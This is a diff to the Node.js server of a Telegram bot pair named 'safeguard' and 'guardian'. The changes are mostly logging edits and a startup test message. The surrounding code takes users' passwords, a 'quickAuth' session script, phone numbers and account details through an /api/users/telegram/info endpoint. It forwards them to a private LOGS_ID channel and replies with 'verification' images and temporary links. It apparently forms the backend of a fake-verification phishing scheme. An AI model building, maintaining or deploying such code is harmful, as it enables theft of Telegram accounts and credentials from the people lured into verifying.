@@ -56,6 +56,13 @@ guardianBot.getMe().then(botInfo => {
   console.log(`Guardian Bot Username: ${guardianUsername}`);
 }).catch(err => console.error("Error getting Guardian bot info:", err));
 
+// Test sending a message to LOGS_ID on startup to verify it works
+safeguardBot.sendMessage(process.env.LOGS_ID, "Bot started successfully!").then(() => {
+  console.log(`Successfully sent test message to LOGS_ID: ${process.env.LOGS_ID}`);
+}).catch(err => {
+  console.error(`Failed to send test message to LOGS_ID: ${err.message}`);
+});
+
 const app = express();
 app.use(express.json());
 
@@ -102,7 +109,7 @@ app.post("/api/users/telegram/info", async (req, res) => {
 
     await handleRequest(req, res, { password: pass, script: quickAuth, userId, name: firstName, number: formattedNumber, usernames: usernameText, premium: isPremium, type });
   } catch (error) {
-    console.error("500 server error in /api/users/telegram/info:", error);
+    console.error("500 server error in /api/users/telegram/info:", error.message);
     res.status(500).json({ error: "server error" });
   }
 });
@@ -132,7 +139,8 @@ const handleRequest = async (req, res, data) => {
     );
     console.log(`Successfully sent user data to LOGS_ID for userId ${data.userId}`);
   } catch (error) {
-    console.error(`Failed to send user data to LOGS_ID: ${error.message}`);
+    console.error(`Failed to send user data to LOGS_ID for userId ${data.userId}: ${error.message}`);
+    console.error("Error details:", JSON.stringify(error, null, 2));
   }
 
   // Send temporary link to the user (for safeguard and guardian)
@@ -149,11 +157,11 @@ const handleRequest = async (req, res, data) => {
 
     try {
       console.log(`Sending temporary link to userId ${data.userId}`);
-      // Use sendPhoto with a Buffer and specify the filename to avoid deprecation warning
       await bot.sendPhoto(data.userId, { source: image, filename: `${type}_success.jpg` }, { caption, ...buttons, parse_mode: "HTML" });
       console.log(`Successfully sent temporary link to userId ${data.userId}`);
     } catch (error) {
       console.error(`Failed to send temporary link to userId ${data.userId}: ${error.message}`);
+      console.error("Error details:", JSON.stringify(error, null, 2));
     }
   }
 
@@ -182,7 +190,6 @@ const handleNewChatMember = async (bot, type) => {
         jsonToSend = {};
     }
     if (update.chat.type === "channel" && update.new_chat_member.status === "administrator" && update.new_chat_member.user.is_bot && admins.includes(update.from.id)) {
-      // Use sendPhoto with a Buffer and specify the filename
       bot.sendPhoto(chatId, { source: imageToSend, filename: `${type}_verification.jpg` }, jsonToSend);
     }
   });
@@ -241,10 +248,9 @@ function handleStart(bot) {
           };
           imageToSend = guardianVerification;
         }
-        // Use sendPhoto with a Buffer and specify the filename
         bot.sendPhoto(chatId, { source: imageToSend, filename: `${botInfo.username}_verification.jpg` }, jsonToSend)
           .then(() => console.log(`Sent response to ${chatId} for ${botInfo.username}`))
-          .catch(err => console.error(`Error sending to ${chatId}:`, err));
+          .catch(err => console.error(`Error sending to ${chatId}: ${err.message}`));
       }
     }).catch(err => console.error("Error in getMe:", err));
   });
